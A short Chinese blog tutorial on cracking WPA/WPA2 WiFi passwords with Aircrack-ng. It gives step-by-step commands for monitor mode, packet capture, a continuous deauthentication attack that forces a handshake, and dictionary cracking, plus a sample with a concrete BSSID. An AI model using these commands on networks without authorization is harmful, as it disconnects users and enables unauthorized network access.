---
layout: post
title: 利用 Aircrack-ng 进行 Wifi 破解
description: Aircrack-ng 是一个与 802.11 标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP 和 WPA/WPA2-PSK 破解。
key: Aircrack-ng, Wifi, Attack
---

### 工具
- Linux 主机
- [Aircrack-ng](https://www.aircrack-ng.org/){:target="_blank"}
- 无线网卡

### 步骤
1. 查看网卡列表: iwconfig
2. 启用用来破解的网卡: airmon-ng start <网卡名>
3. 重新查看网卡列表，指定网卡启用后网卡名会变: iwconfig
4. 查看 wifi 列表: airodump-ng <网卡名>
5. 抓取目标 wifi 的网络包并存储: airodump-ng -c <channel> --bssid <wifi 破解目标的bssid> -w <文件名> <网卡名>
6. 获取握手包，直到出现 WPA handshake: aireplay-ng -0 0 -a <bssid> <网卡名>
7. 利用字典破解 .cap 数据包: aircrack-ng -w <字典名> -b <bssid> 文件名*.cap

### 样例
```
iwconfig
airmon-ng start wlp0s20u1
iwconfig
airodump-ng wlp0s20u1mon
airodump-ng -c 6 --bssid C0:61:18:29:9D:28 -w wifiname wlp0s20u1mon
aireplay-ng -0 0 -a C0:61:18:29:9D:28 wlp0s20u1mon
aircrack-ng -w wordlist.txt -b C0:61:18:29:9D:28 wifiname*.cap
```